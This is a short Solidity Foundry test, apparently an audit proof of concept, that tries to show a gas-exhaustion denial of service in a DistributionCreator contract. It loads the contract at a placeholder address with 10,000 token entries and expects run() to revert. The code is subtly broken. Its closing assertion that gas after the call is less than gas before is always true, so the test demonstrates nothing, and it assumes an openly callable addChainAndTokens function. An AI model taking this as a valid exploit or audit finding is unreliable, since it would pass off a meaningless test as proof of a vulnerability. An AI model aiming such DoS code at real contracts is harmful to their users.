// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributionCreator {
    function run() external;
    function addChainAndTokens(uint256 chainId, address[] calldata tokens) external;
}

contract ExploitTest is Test {
    IDistributionCreator distributionCreator;

    function setUp() public {
        // Deploy the DistributionCreator contract
        // Assuming the contract is already deployed at a known address
        distributionCreator = IDistributionCreator(0x1234567890123456789012345678901234567890);

        // Set up the state with a large number of chains and tokens
        for (uint256 i = 0; i < 100; i++) {
            address[] memory tokens = new address[](100);
            for (uint256 j = 0; j < 100; j++) {
                tokens[j] = address(uint160(j + 1));
            }
            distributionCreator.addChainAndTokens(i, tokens);
        }
    }

    function test_exploit() public {
        // Measure gas before calling the vulnerable function
        uint256 gasBefore = gasleft();

        // Expect the transaction to revert due to out-of-gas
        vm.expectRevert();

        // Call the vulnerable function
        distributionCreator.run();

        // Measure gas after calling the vulnerable function
        uint256 gasAfter = gasleft();

        // Assert that the gas used is excessive
        assertLt(gasAfter, gasBefore);
    }
}